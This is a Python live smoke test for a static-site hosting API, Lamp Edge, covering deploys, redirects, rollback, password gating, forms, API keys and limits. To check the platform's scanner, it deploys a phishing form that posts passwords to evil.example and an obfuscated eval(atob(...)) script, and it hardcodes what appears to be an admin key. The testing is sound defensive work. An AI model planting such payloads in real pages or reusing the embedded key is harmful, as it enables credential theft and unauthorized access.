#!/usr/bin/env python3
"""Lamp Edge 엔진 스모크 테스트 (라이브)."""
import base64
import json
import os
import sys
import time
import urllib.error
import urllib.request

BASE = os.environ.get("LAMP_BASE", "https://lamp-edge.helpaboutflux.workers.dev")
KEY = os.environ.get("LAMP_ADMIN_KEY", "lampadm_9f4cChZqT2vRn7YbKp3LsDxW")
ok_n = 0
bad_n = 0
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0 Safari/537.36"


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def req(method, path, body=None, headers=None, raw=False):
    data = None
    h = {"x-lamp-key": KEY, "user-agent": UA}
    if body is not None:
        data = json.dumps(body).encode()
        h["content-type"] = "application/json"
    if headers:
        h.update(headers)
    r = urllib.request.Request(BASE + path, data=data, method=method, headers=h)
    opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(r, timeout=60) as resp:
            payload = resp.read()
            code = resp.status
            hdrs = resp.headers
    except urllib.error.HTTPError as e:
        payload = e.read()
        code = e.code
        hdrs = e.headers
    if raw:
        return code, payload, hdrs
    try:
        return code, json.loads(payload.decode()), hdrs
    except Exception:
        return code, payload.decode("utf-8", "replace"), hdrs


def deploy(slug, files, **kw):
    """속도 제한(1분 5회)에 걸리면 기다렸다가 다시 시도한다."""
    body = {"files": files, **kw}
    for _ in range(4):
        code, r, _ = req("POST", "/api/sites/%s/deploy" % slug, body)
        if code == 429:
            print("   ... 429, 62s 대기")
            time.sleep(62)
            continue
        return code, r
    return code, r


def check(name, cond, extra=""):
    global ok_n, bad_n
    if cond:
        ok_n += 1
        print("PASS", name)
    else:
        bad_n += 1
        print("FAIL", name, extra)


def main():
    slug = "smoke-lamp"
    req("DELETE", "/api/sites/" + slug)
    code, r, _ = req("POST", "/api/sites", {"slug": slug, "name": "스모크 테스트"})
    check("site create", code == 201 and r.get("ok"), str(r)[:200])

    files = [
        {"path": "index.html", "text": "<!doctype html><html><head><title>Lamp smoke</title></head><body><h1>hello lamp</h1><p>ok</p></body></html>"},
        {"path": "about/index.html", "text": "<!doctype html><title>about</title><h1>about</h1>"},
        {"path": "assets/app.js", "text": "console.log('lamp');"},
        {"path": "style.css", "text": "h1{color:#f5a524}"},
        {"path": "404.html", "text": "<!doctype html><h1>custom 404</h1>"},
        {"path": "_redirects", "text": "/old /new 301\n/docs/* /guide/:splat 302\n"},
        {"path": "_headers", "text": "/*\n  X-Frame-Options: DENY\n  X-Lamp-Test: yes\n"},
        {"path": "logo.png", "base64": base64.b64encode(b"\x89PNG\r\n\x1a\nFAKEPNG").decode(), "type": "image/png"},
    ]
    code, r = deploy(slug, files, message="첫 배포")
    check("deploy", code == 200 and r.get("ok"), str(r)[:300])

    code, body, hdrs = req("GET", "/%s/" % slug, raw=True)
    check("serve index", code == 200 and b"hello lamp" in body, "%s %s" % (code, body[:80]))
    check("content-type html", "text/html" in hdrs.get("content-type", ""), hdrs.get("content-type", ""))
    check("_headers applied", hdrs.get("x-frame-options") == "DENY", str(hdrs.get("x-frame-options")))

    code, body, hdrs = req("GET", "/%s/about/" % slug, raw=True)
    check("dir index", code == 200 and b"about" in body)
    code, body, hdrs = req("GET", "/%s/assets/app.js" % slug, raw=True)
    check("js type", "javascript" in hdrs.get("content-type", ""), hdrs.get("content-type", ""))
    code, body, hdrs = req("GET", "/%s/logo.png" % slug, raw=True)
    check("binary file", code == 200 and body[:4] == b"\x89PNG")

    code, body, hdrs = req("GET", "/%s/old" % slug, raw=True)
    check("redirect 301", code == 301 and hdrs.get("location", "").endswith("/new"), "%s %s" % (code, hdrs.get("location")))
    code, body, hdrs = req("GET", "/%s/docs/intro" % slug, raw=True)
    check("redirect splat", code == 302 and hdrs.get("location", "").endswith("/guide/intro"), hdrs.get("location", ""))

    code, body, hdrs = req("GET", "/%s/nope" % slug, raw=True)
    check("custom 404", code == 404 and b"custom 404" in body, "%s" % code)

    code, r, _ = req("GET", "/api/sites/%s" % slug)
    check("site detail", code == 200 and r["site"]["version"] == 1)
    code, r2 = deploy(slug, [{"path": "index.html", "text": "<h1>v2</h1>"}], message="v2")
    check("second deploy", code == 200 and r2["deploy"]["v"] == 2, str(r2)[:200])
    code, body, _ = req("GET", "/%s/" % slug, raw=True)
    check("v2 live", b"v2" in body, body[:60])
    code, r3, _ = req("POST", "/api/sites/%s/rollback" % slug, {"version": 1})
    check("rollback", code == 200 and r3["site"]["current"] == 1, str(r3)[:200])
    code, body, _ = req("GET", "/%s/" % slug, raw=True)
    check("rollback live", b"hello lamp" in body, body[:60])

    code, zbody, hdrs = req("GET", "/api/sites/%s/zip/1" % slug, raw=True)
    check("zip download", code == 200 and zbody[:2] == b"PK", "%s %s" % (code, zbody[:8]))

    code, body, _ = req("GET", "/%s/" % slug, raw=True)
    time.sleep(1)
    code, a, _ = req("GET", "/api/sites/%s/analytics?days=7" % slug)
    check("analytics", code == 200 and a["total"] >= 1 and len(a["daily"]) == 7, str(a)[:200])

    # 비밀번호 잠금
    code, r, _ = req("PATCH", "/api/sites/%s" % slug, {"password": "lamp1234", "private": True})
    check("set password", code == 200 and r["site"]["hasPassword"], str(r)[:200])
    code, body, hdrs = req("GET", "/%s/" % slug, raw=True)
    check("gate blocks", code == 200 and "비밀번호".encode() in body and b"hello lamp" not in body, body[:80])
    import urllib.parse
    form = urllib.parse.urlencode({"slug": slug, "pw": "lamp1234"}).encode()
    r2 = urllib.request.Request(BASE + "/__lamp/unlock", data=form, method="POST",
                                headers={"content-type": "application/x-www-form-urlencoded", "user-agent": UA})
    opener = urllib.request.build_opener(NoRedirect)
    try:
        resp = opener.open(r2, timeout=30)
    except urllib.error.HTTPError as err:
        resp = err
    cookie = resp.headers.get("set-cookie", "")
    cookie = cookie.split(";")[0]
    code, body, hdrs = req("GET", "/%s/" % slug, raw=True, headers={"cookie": cookie})
    check("unlock cookie", b"hello lamp" in body, body[:100])
    code, r, _ = req("PATCH", "/api/sites/%s" % slug, {"password": "", "private": False})

    # 프리뷰
    code, r = deploy(slug, [{"path": "index.html", "text": "<h1>preview only</h1>"}], preview=True, message="preview")
    pv = r.get("deploy", {}).get("v")
    code, body, _ = req("GET", "/%s/" % slug, raw=True)
    check("preview not live", b"hello lamp" in body, body[:60])
    code, body, _ = req("GET", "/p/%s/%s/" % (slug, pv), raw=True)
    check("preview url", b"preview only" in body, body[:80])

    # 스캔 차단
    code, r = deploy(slug, [
        {"path": "index.html", "text": "<form action='https://evil.example/collect'><input type=password name=p></form>ok"}], message="phish")
    check("phishing blocked", code == 422 and r.get("error", {}).get("code") == "blocked_scan", str(r)[:200])
    code, r = deploy(slug, [
        {"path": "index.html", "text": "<script>eval(atob('ZG9jdW1lbnQ='))</script>"}], message="malware")
    check("malware blocked", code == 422, str(r)[:160])

    # 용량 제한
    big = "x" * (11 * 1024 * 1024)
    code, r = deploy(slug, [{"path": "big.txt", "text": big}], message="big")
    check("size limit", code == 413, str(r)[:160])

    # 속도 제한 (5회 초과)
    blocked = False
    for i in range(8):
        code, r, _ = req("POST", "/api/sites/%s/deploy" % slug, {"files": [{"path": "rl.txt", "text": "n%d" % i}], "message": "rl"})
        if code == 429:
            blocked = True
            break
    check("rate limit 5/min", blocked, "code=%s" % code)

    # 폼
    code, r, _ = req("POST", "/api/sites/%s/forms" % slug, {"name": "문의", "fields": [{"name": "email", "label": "이메일"}]})
    fid = r.get("form", {}).get("id")
    check("form create", code == 200 and fid, str(r)[:200])
    if fid:
        r3 = urllib.request.Request(BASE + "/f/" + fid, data=json.dumps({"email": "a@b.co"}).encode(),
                                    method="POST", headers={"content-type": "application/json", "user-agent": UA})
        with urllib.request.urlopen(r3, timeout=30) as resp:
            check("form submit", resp.status == 200)
        code, r, _ = req("GET", "/api/sites/%s/submissions" % slug)
        check("submissions read", code == 200 and r.get("count", 0) >= 1, str(r)[:200])

    # API 키
    code, r, _ = req("POST", "/api/keys", {"label": "테스트 키"})
    k = r.get("key")
    check("api key issue", code == 200 and k and k.startswith("lamp_"), str(r)[:160])
    if k:
        r4 = urllib.request.Request(BASE + "/api/me", headers={"x-lamp-key": k, "user-agent": UA})
        with urllib.request.urlopen(r4, timeout=30) as resp:
            me = json.loads(resp.read())
        check("api key works", me.get("ok") and me["user"]["id"] == "admin", str(me)[:160])

    # A/B
    code, r, _ = req("PATCH", "/api/sites/%s" % slug, {"abtest": {"active": True, "variants": [{"name": "A", "version": 1, "weight": 50}, {"name": "B", "version": 2, "weight": 50}]}})
    check("ab setup", code == 200 and r["site"]["abtest"]["active"], str(r)[:160])
    seen = set()
    for i in range(12):
        code, body, hdrs = req("GET", "/%s/" % slug, raw=True)
        seen.add("v2" if b"v2" in body else "v1")
    check("ab splits", len(seen) == 2, str(seen))
    req("PATCH", "/api/sites/%s" % slug, {"abtest": None})

    # 한도
    for i in range(12):
        req("DELETE", "/api/sites/limit-%d" % i)
    created = 0
    for i in range(12):
        code, r, _ = req("POST", "/api/sites", {"slug": "limit-%d" % i, "name": "limit"})
        if code == 201:
            created += 1
        elif code == 403:
            break
    check("site limit 10", created > 0 and created <= 10, "created=%d" % created)
    for i in range(12):
        req("DELETE", "/api/sites/limit-%d" % i)

    code, r, _ = req("DELETE", "/api/sites/" + slug)
    check("site delete", code == 200, str(r)[:120])

    print("\n%d passed, %d failed" % (ok_n, bad_n))
    return 1 if bad_n else 0


if __name__ == "__main__":
    sys.exit(main())
